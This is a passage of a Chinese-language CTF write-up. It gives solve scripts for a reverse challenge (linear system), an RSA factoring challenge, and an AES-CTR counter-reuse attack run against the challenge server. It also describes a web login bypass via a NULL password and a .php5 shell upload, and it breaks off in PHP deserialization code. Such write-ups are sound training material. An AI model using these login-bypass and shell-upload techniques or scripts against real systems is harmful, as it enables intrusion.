class="line"><span class="comment"># - 6946 * a1[12]</span></span><br><span class="line"><span class="comment"># - 23187 * a1[13]</span></span><br><span class="line"><span class="comment"># - 46495 * a1[15]</span></span><br><span class="line"><span class="comment"># - 8395 * a1[16]</span></span><br><span class="line"><span class="comment"># - 27782 * a1[18]</span></span><br><span class="line"><span class="comment"># - 46043 * a1[21]</span></span><br><span class="line"><span class="comment"># - 15428 * a1[25]</span></span><br><span class="line"><span class="comment"># - 59010 * a1[28]</span></span><br><span class="line"><span class="comment"># - 49235 * a1[29]</span></span><br><span class="line"><span class="comment"># - 53666 * a1[30]</span></span><br><span class="line"><span class="comment"># + 28539 * a1[31] == -15479857 '''</span></span><br><span class="line"><span class="comment"># a = a.replace("a1","").split("\n")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># matrix = [0 for i in range(32)]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment"># f = re.search("([+-]?) ([0-9]*)",a[i]).groups()[0]</span></span><br><span class="line"><span class="comment"># value = int(re.search("([+-]?) ([0-9]*)",a[i]).groups()[1])</span></span><br><span class="line"><span class="comment"># if f != '':</span></span><br><span class="line"><span class="comment"># if f == '-':</span></span><br><span class="line"><span class="comment"># value = -1*value</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># pass</span></span><br><span class="line"><span class="comment"># idx = int(a[i][a[i].find('[')+1:a[i].find(']')])</span></span><br><span class="line"><span class="comment"># matrix[idx] = value</span></span><br><span class="line"><span class="comment"># m = ''</span></span><br><span class="line"><span class="comment"># for i in matrix:</span></span><br><span class="line"><span class="comment"># m += str(i)+','</span></span><br><span class="line"><span class="comment"># m = m.strip(',')</span></span><br><span class="line"><span class="comment"># print m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://www.yunsuan.info/matrixcomputations/solvelinearsystems.html</span></span><br><span class="line"><span class="comment"># 44493,-326,-57451,-18424,22432,45266,20069,47551,-3751,39591,35081,45204,-6984,-9410,-54261,2139,48734,-62111,44970,29470,-20305,-33120,39390,1513,58180,-11160,-24198,37157,50244,-1646,37027,-13318</span></span><br><span class="line"><span class="comment"># -54741,-3606,48560,-45416,22008,11900,-24275,-64371,32499,46114,-25714,21730,-56673,9624,28702,-39430,9187,-35779,26720,-15144,51548,11260,48594,-45050,-59016,50109,-29262,-55650,-29492,-13828,12535,40522</span></span><br><span class="line"><span class="comment"># 17703,-16114,-24359,54532,15266,5819,-33999,19362,-58904,63538,64858,2665,-11844,-29623,20144,43681,32755,-42532,-60912,20331,3541,53780,29817,-4711,-56853,57822,31675,52683,57988,-33486,12097,24590</span></span><br><span class="line"><span class="comment"># 24247,64898,-24733,3430,41149,17219,-16545,42702,-1315,24960,27013,28,2783,-15867,-12126,28232,-3823,37522,48151,-20727,-12037,-9347,-39338,-50524,-38675,-26114,-4975,59561,32393,36741,51792,-24297</span></span><br><span class="line"><span class="comment"># -32261,-54551,15294,-61664,-40648,-12277,-55300,-63212,41251,-45548,-22362,-32993,64221,-43046,-40770,5380,57738,62825,52035,3079,-7119,26782,-36194,-56102,-19468,54655,35562,-59856,25143,13289,64702,23822</span></span><br><span class="line"><span class="comment"># -9407,64048,60965,33702,-12654,-56126,-47366,47843,30627,-29056,32583,-50822,-6240,43847,47577,-12371,8314,22558,9886,43924,-23282,-13137,-13716,6461,63681,-43391,-37217,-43714,-55909,-62806,5977,36688</span></span><br><span class="line"><span class="comment"># -23136,47281,20301,-61441,2565,57144,44459,-31365,16024,54218,-56894,-52977,-39404,-63477,63390,-22773,46343,-50258,40389,-25970,23917,-56685,47030,5856,-55893,36904,44955,58093,13407,49426,26401,-25199</span></span><br><span class="line"><span class="comment"># 62577,23069,18654,4696,22400,-16178,42663,-34941,-50803,-28229,15341,3911,-45565,50053,-45774,18373,7881,-28140,1742,-29986,58351,14952,-40067,15201,11269,53436,41681,22198,-63863,-50393,-14615,16722</span></span><br><span class="line"><span class="comment"># -39728,57392,910,37963,-2274,-61995,-43938,-12412,-10642,-10303,31888,7362,-16356,-615,40135,-11314,-17185,54431,-61134,-4620,-4591,29560,35119,-51958,40581,34037,-65066,5750,-6232,-60002,17326,30503</span></span><br><span class="line"><span class="comment"># -16296,-8786,48180,-65236,-48383,-32713,61315,-58771,-47593,-14512,6483,56260,25366,58190,-60203,27537,50686,-7295,-3885,61335,-39212,-40687,-19258,-57463,32582,2313,-24504,-11629,-8917,31106,-4535,38212</span></span><br><span class="line"><span class="comment"># -31610,52623,-35005,25689,-9320,63683,39253,51102,-16508,11413,3265,35320,18706,6847,-55110,528,35247,-63180,30153,-13666,39538,-49046,33264,51928,13203,17103,59096,48721,33683,-42949,-60950,26096</span></span><br><span class="line"><span class="comment"># 47557,52902,-12806,-59773,-9182,-57417,-18447,6146,15859,59808,30791,-54963,45466,-61599,49637,21116,15786,3656,-18454,28722,46709,21307,50390,5176,-30277,-25544,-17882,-25149,61328,-17363,49588,21848</span></span><br><span class="line"><span class="comment"># 37688,23309,-2616,59129,5104,-12561,-3215,60503,29438,42505,-49703,38339,12457,45365,-15471,33925,-23447,-50859,-86,54770,36604,-3773,-9573,-25835,42417,4680,-20107,58284,-45915,-56171,18191,29164</span></span><br><span class="line"><span class="comment"># 20452,18062,-56424,56918,-10457,50206,-12288,-54591,-44777,24700,12962,38458,-52078,19385,18867,-9805,-48011,-27363,-20890,13714,-788,50998,29867,-7954,-34056,16127,5149,49705,-34732,-54092,64657,35416</span></span><br><span class="line"><span class="comment"># -39611,25246,1951,-37145,-3824,21330,-49145,-43603,8191,-60671,-53032,-48392,-15417,40645,-13059,-58653,42329,-51631,-50173,18903,52431,-44904,37330,40656,-34380,24333,41644,-18100,-57765,-64534,44968,-26760</span></span><br><span class="line"><span class="comment"># -39824,44401,45166,53538,-2540,43929,-54452,-11199,-19801,23926,-13592,47959,19579,-29922,30392,15405,61374,17545,39526,7046,-34144,57593,-5305,-46917,44211,-4511,-23881,29438,-39081,34688,28579,3296</span></span><br><span class="line"><span class="comment"># 62215,19566,15203,-30340,-15964,59815,-13939,60087,-43008,-44925,-49239,-40498,-54453,-33557,6928,24510,36587,-24721,7959,49381,-21456,-40311,8487,-61111,-18918,-33393,-9301,41415,-61619,64380,40454,58498</span></span><br><span class="line"><span class="comment"># 35423,-12994,33894,40977,57560,63291,-32256,-23534,40291,5725,-40660,43131,-19119,21483,39085,62097,-33732,-63756,35027,3633,30380,36333,-13528,53612,6578,-47605,10809,-43202,14305,2766,-42819,-34232</span></span><br><span class="line"><span class="comment"># 44942,63420,58838,55103,27162,53130,27559,26302,-24313,-42499,-21629,34155,-2633,-55014,-22926,19761,-305,-63708,13647,31419,62674,-32334,-47684,-54226,-50848,10136,26215,44427,27903,48054,-15102,-22362</span></span><br><span class="line"><span class="comment"># 6300,-30549,9153,26426,46559,-55683,62261,-44433,6137,-46194,-57198,33875,-45266,51231,65438,45781,-6605,-43397,-7672,-48485,-54035,-12567,-47051,-62256,13058,55552,4221,61587,23936,-9828,59525,50225</span></span><br><span class="line"><span class="comment"># -28415,36297,5686,59059,14796,-11307,-57251,-29507,-41415,12090,62270,8353,-24476,-41751,-46589,63967,55058,10481,30422,47722,-55870,-6321,53136,12704,42884,-34350,-32922,-64909,-50870,13236,39286,49349</span></span><br><span class="line"><span class="comment"># 15479,10453,58731,-9782,63976,-9166,5707,-21516,-2689,29174,23244,-47968,-38843,-13488,61646,3991,57764,-57649,63445,-487,6252,52361,16634,42491,-30704,54808,-61218,18612,-32873,-58677,-2280,35233</span></span><br><span class="line"><span class="comment"># 36368,-30534,50614,-7805,9520,-60795,-17511,-34692,-22139,-49013,-24672,41197,35504,28641,11252,-22264,56629,23301,-55578,-61882,-48469,28509,-8197,-43020,15688,29396,-36911,38392,58430,-6762,38132,56670</span></span><br><span class="line"><span class="comment"># 3542,-17533,28247,1791,-44455,-2748,21876,-38052,8511,61205,-16528,-4664,-13326,16494,-52661,-38860,58300,-60164,-39975,-19566,55072,-55251,-8160,-54674,58305,-29010,-6627,35318,-15962,19958,-10549,-8177</span></span><br><span class="line"><span class="comment"># -7510,-61303,25124,35004,-34033,-49161,-6021,-36125,37617,-10528,-47741,-45531,-1546,2052,-59464,29853,-22656,31346,26883,38644,26034,-24655,-9816,8621,-22299,-23745,37204,47703,13827,15394,-23945,48741</span></span><br><span class="line"><span class="comment"># 19310,1288,-38840,-49229,-40618,39102,34746,-41363,-45367,41169,-21440,-36535,33349,-43289,47866,5395,56668,-41392,30949,53570,-40337,16432,-1430,-28334,35917,-46487,61644,8511,-42458,27496,-59664,64335</span></span><br><span class="line"><span class="comment"># -18187,28981,-53485,17974,41797,-20458,-8491,-16831,33384,53494,-31995,51835,-12109,30996,42087,60427,12986,-51691,-58925,-40872,33269,3954,56824,-30202,59304,-30793,26203,13806,-42110,41403,-1100,-26194</span></span><br><span class="line"><span class="comment"># -40011,-26232,-4849,-60564,20386,44081,-50739,40590,-17237,19883,-35381,28950,-4203,19225,-50964,-39946,28859,12186,38175,-22511,-20539,15071,48156,34737,42732,-60250,-61430,-11009,47559,53536,-8879,46741</span></span><br><span class="line"><span class="comment"># -42653,43668,-10988,3756,34932,61953,22126,29632,59350,-48711,-23958,-33557,50367,41961,-17831,-4583,41615,27387,34328,-29750,9871,-49888,41239,18672,20039,56136,-30956,7689,45907,5442,-41068,23514</span></span><br><span class="line"><span class="comment"># -26968,-23313,38342,5179,10458,3678,-32333,-43275,-2423,-60827,-42621,15986,-27590,59508,53583,19553,-56307,869,6738,63177,-30359,50228,21760,-19919,24036,-18153,41909,-6931,-5822,-30949,-16572,11920</span></span><br><span class="line"><span class="comment"># 8386,57646,35980,-4029,8314,18877,4313,29760,-47059,46356,52295,35013,57567,-25490,64744,1703,55168,-62526,37870,-63227,-27315,31098,6747,63177,55323,-23370,-37329,54696,-6309,43819,-12433,8882</span></span><br><span class="line"><span class="comment"># 63776,8682,-16324,-20022,143,-48973,-57775,-43820,-41070,33388,25687,-15669,-6946,-23187,32765,-46495,-8395,17994,-27782,39834,42821,-46043,12690,36806,28202,-15428,41549,17153,-59010,-49235,-53666,28539</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 34771791</span></span><br><span class="line"><span class="comment"># -9451883</span></span><br><span class="line"><span class="comment"># 29782736</span></span><br><span class="line"><span class="comment"># 27959979</span></span><br><span class="line"><span class="comment"># -10644544</span></span><br><span class="line"><span class="comment"># 230179</span></span><br><span class="line"><span class="comment"># 15871572</span></span><br><span class="line"><span class="comment"># 12844672</span></span><br><span class="line"><span class="comment"># -7906855</span></span><br><span class="line"><span class="comment"># -5359162</span></span><br><span class="line"><span class="comment"># 34815239</span></span><br><span class="line"><span class="comment"># 23582278</span></span><br><span class="line"><span class="comment"># 30273764</span></span><br><span class="line"><span class="comment"># 7501764</span></span><br><span class="line"><span class="comment"># -35816639</span></span><br><span class="line"><span class="comment"># 30983928</span></span><br><span class="line"><span class="comment"># -4472687</span></span><br><span class="line"><span class="comment"># 18523534</span></span><br><span class="line"><span class="comment"># 20982750</span></span><br><span class="line"><span class="comment"># 5070455</span></span><br><span class="line"><span class="comment"># 3066924</span></span><br><span class="line"><span class="comment"># 26232118</span></span><br><span class="line"><span class="comment"># -860377</span></span><br><span class="line"><span class="comment"># -14482154</span></span><br><span class="line"><span class="comment"># -17062269</span></span><br><span class="line"><span class="comment"># 6695285</span></span><br><span class="line"><span class="comment"># 16909859</span></span><br><span class="line"><span class="comment"># -1622782</span></span><br><span class="line"><span class="comment"># 33025495</span></span><br><span class="line"><span class="comment"># -10454601</span></span><br><span class="line"><span class="comment"># 51177223</span></span><br><span class="line"><span class="comment"># -15479857</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = [<span class="number">99</span>,<span class="number">115</span>,<span class="number">50</span>,<span class="number">56</span>,<span class="number">82</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">72</span>,<span class="number">113</span>,<span class="number">115</span>,<span class="number">98</span>,<span class="number">117</span>,<span class="number">102</span>,<span class="number">111</span>,<span class="number">106</span>,<span class="number">115</span>,<span class="number">76</span>,<span class="number">122</span>,<span class="number">55</span>,<span class="number">121</span>,<span class="number">103</span>,<span class="number">50</span>,<span class="number">68</span>,<span class="number">89</span>,<span class="number">113</span>,<span class="number">87</span>,<span class="number">81</span>,<span class="number">69</span>,<span class="number">69</span>,<span class="number">99</span>,<span class="number">89</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> res])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">nnn1=int(str(n)[:<span class="number">200</span>])<span class="number">-1</span></span><br><span class="line">nnn2=int(str(n)[<span class="number">600</span>:])</span><br><span class="line">ab=int(str(nnn1)+str(nnn2))</span><br><span class="line"></span><br><span class="line">ab=<span class="number">2117306430457495084373744640919209184441085835440785339151821982858580957554648046398035452941253078562547380021066127607547324391257803263684574686690799140082210093930925498879813981907487546461281266736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line"></span><br><span class="line">a2b2=n-(pow(<span class="number">10</span>,<span class="number">400</span>)+<span class="number">1</span>)*ab <span class="comment">#a**2+b**2</span></span><br><span class="line"><span class="comment"># print a2b2</span></span><br><span class="line">t=a2b2/pow(<span class="number">10</span>,<span class="number">200</span>)</span><br><span class="line"><span class="comment"># print t </span></span><br><span class="line"></span><br><span class="line">t1=t+<span class="number">2</span>*ab <span class="comment">#(a+b)**2</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a+b)**2:"</span>,t1 <span class="comment">#(a+b)**2 </span></span><br><span class="line">t2=t1<span class="number">-4</span>*ab <span class="comment">#(a-b)**2</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a-b)**2:"</span>,t2 <span class="comment">#(a-b)**2 </span></span><br><span class="line"></span><br><span class="line">tt1=iroot(t1,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a+b):"</span>,tt1 <span class="comment">#(a+b)</span></span><br><span class="line">tt2=iroot(t2,<span class="number">2</span>)[<span class="number">0</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a-b):"</span>,tt2 <span class="comment">#(a-b)</span></span><br><span class="line"></span><br><span class="line">b=(tt1-tt2)/<span class="number">2</span></span><br><span class="line">a=tt1-b</span><br><span class="line"><span class="keyword">print</span> <span class="string">"b:"</span>,b</span><br><span class="line"><span class="keyword">print</span> <span class="string">"a:"</span>,a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> iroot(t1,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> iroot(t2,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p = a*pow(<span class="number">10</span>,<span class="number">200</span>)+b</span><br><span class="line">q = b*pow(<span class="number">10</span>,<span class="number">200</span>)+a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p*q==n</span><br><span class="line"><span class="keyword">print</span> <span class="string">"p"</span>,p</span><br><span class="line"><span class="keyword">print</span> <span class="string">"q"</span>,q</span><br><span class="line"></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"d"</span>,d</span><br><span class="line">c=<span class="number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span></span><br><span class="line">flag = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="keyword">print</span> hex(flag)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>查看加密函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    ctr = Counter.new(<span class="number">128</span>,  initial_value=sum(msg))</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(msg)</span><br></pre></td></tr></table></figure><p>是使用AES的CTR模式，百度了下是把<code>counter</code>加密和明文异或下，即密文是<code>counter^msg</code>,这里的问题就是<code>ctr</code>的初始值是<code>sum(msg)</code>，如果我们输入字符串的<code>sum</code>和<code>flag</code>一样的话，那<code>counter</code>就是一样的，所以<code>flag = encflag^input^enc_input</code></p><p>爆破脚本为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span><span class="params">(str1)</span>:</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line">idx = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line"><span class="keyword">if</span> str1[idx] != <span class="string">'\\'</span>:</span><br><span class="line">res += str1[idx]</span><br><span class="line">idx += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> str1[idx] == <span class="string">'\\'</span> <span class="keyword">and</span> str1[idx+<span class="number">1</span>] == <span class="string">'x'</span> <span class="keyword">and</span> str1[idx+<span class="number">2</span>] <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span> <span class="keyword">and</span> str1[idx+<span class="number">3</span>] <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">res += chr(int(str1[idx+<span class="number">2</span>:idx+<span class="number">4</span>],<span class="number">16</span>))</span><br><span class="line">idx += <span class="number">4</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res += str1[idx]</span><br><span class="line">idx += <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span>(len(res) == <span class="number">30</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="comment"># p = remote("111.186.57.123",10001)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(str1)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line"><span class="keyword">if</span> ord(str1[i]) &lt; <span class="number">0x20</span> <span class="keyword">or</span> ord(str1[i]) &gt; <span class="number">0x7f</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">start = <span class="number">0x20</span>*<span class="number">30</span></span><br><span class="line">end = <span class="number">0x7f</span>*<span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = [<span class="number">0x20</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("plaintext: ")</span></span><br><span class="line"><span class="keyword">while</span> sum(l) &lt; end:</span><br><span class="line"><span class="comment"># p = process("./aes.py")</span></span><br><span class="line">p = remote(<span class="string">"111.186.57.123"</span>,<span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">"flag: b"</span>)</span><br><span class="line">enc_flag = p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">encflag = encode_str(enc_flag)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">p.recvuntil(<span class="string">"plaintext: "</span>)</span><br><span class="line">plaintext = (<span class="string">''</span>.join([chr(_) <span class="keyword">for</span> _ <span class="keyword">in</span> l]))</span><br><span class="line">p.sendline(plaintext.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="comment">#inc the l</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line"><span class="keyword">if</span> l[k] &lt; <span class="number">0x7f</span>:</span><br><span class="line">l[k] += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ciphertext: b"</span>)</span><br><span class="line">ciphertext = encode_str(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">res = long_to_bytes(bytes_to_long(ciphertext)^bytes_to_long(plaintext)^bytes_to_long(encflag))</span><br><span class="line"><span class="keyword">if</span> check(res) == <span class="literal">True</span>:</span><br><span class="line">success(<span class="string">"flag is : %s"</span> % res)</span><br><span class="line">sys.exit()</span><br><span class="line">info(str(sum(l)))</span><br><span class="line">p.close()</span><br><span class="line"><span class="comment"># p.kill()</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure><p>最终<code>sum(flag)</code>在2760到2790之间<br>flag为 <code>flag{Don&#39;t_Reu5e_n0nCe_1n_CTR}</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p><code>&lt;!---/.login.php.swp--&gt;</code>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($username))&#123;</span><br><span class="line">    $sql = <span class="string">"select password from user where name=?"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($stmt = $mysqli-&gt;prepare($sql)) &#123;</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($dpasswd);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> ($dpasswd === $password)&#123;</span><br><span class="line">    $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            header(<span class="string">"Location: /upload.php"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $stmt-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: /index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure><p>mysql没有查到记录时,<code>$dpasswd===NULL</code><br>此时令<code>$password===NULL</code>即<code>$_POST[&#39;password&#39;]===NULL</code>,则成功登陆</p><p>登陆后进入上传界面,测试发现,后端校验文件头和content-type<br>过滤php后缀名,上传.php5文件,成功拿到shell</p><p>拿到flag:flag{logical_bypass_not_weak_password}</p><h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><p>n day json bypass disable_function</p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire = <span class="string">'8888'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cache = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $autosave = <span class="keyword">false</span>;</span><br><span 